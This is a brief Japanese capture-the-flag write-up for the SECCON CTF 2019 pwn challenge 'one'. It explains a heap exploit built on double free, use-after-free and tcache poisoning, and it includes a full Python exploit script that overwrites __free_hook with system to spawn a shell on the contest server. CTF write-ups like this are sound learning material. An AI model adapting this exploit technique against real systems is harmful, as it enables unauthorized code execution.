# [pwn 264pts] one - SECCON CTF 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f one
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   82 Symbols     Yes      0               4       one
```
double freeやUAFがありますがmallocできるサイズは固定で、置いておけるポインタも1つだけです。
とりあえずheap leakします。libc leakするにはunsorted binに繋げる必要があるのでサイズを変更しますが、偽チャンクをいい場所に用意する必要もあるのでそれを先に用意します。あとはtcacheの管理領域をぶっ壊してサイズが書き換えられる場所に繋いでやります。libc leakできたらtcache poisoningするだけ。
```python
from ptrlib import *

def add(data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", data)
    return
def show():
    sock.sendlineafter("> ", "2")
    return sock.recvline()
def delete():
    sock.sendlineafter("> ", "3")
    return

libc = ELF("./libc-2.27.so")
#sock = Process("./one")
sock = Socket("one.chal.seccon.jp", 18357)

# leak heap
add('A')
delete()
delete()
delete()
addr_heap = u64(show())
logger.info("heap = " + hex(addr_heap))

# tamper size
add(p64(addr_heap - 0x10))
add('dummy')
add(p64(addr_heap) + p64(0xdeadbeef))

# tamper tcache
for i in range(0x11):
    add(((p64(0) + p64(0x21)) * 3)[:-1])
add('A')
delete()
delete()
delete()
delete()
delete()
add(p64(addr_heap - 0x10))
add('A' * 8)
add(p64(0) + p64(0x421) + p64(addr_heap + 0x50))
add('A' * 8)
delete()
libc_base = u64(show()) - 0x3ebc40 - 96
logger.info("libc base = " + hex(libc_base))

# tcache poisoning
add('A')
delete()
delete()
add(p64(libc_base + libc.symbol("__free_hook")))
add('dummy')
add(p64(libc_base + libc.symbol("system")))
add("/bin/sh")
delete()

sock.interactive()
```

# 感想
tcacheって感じですね。
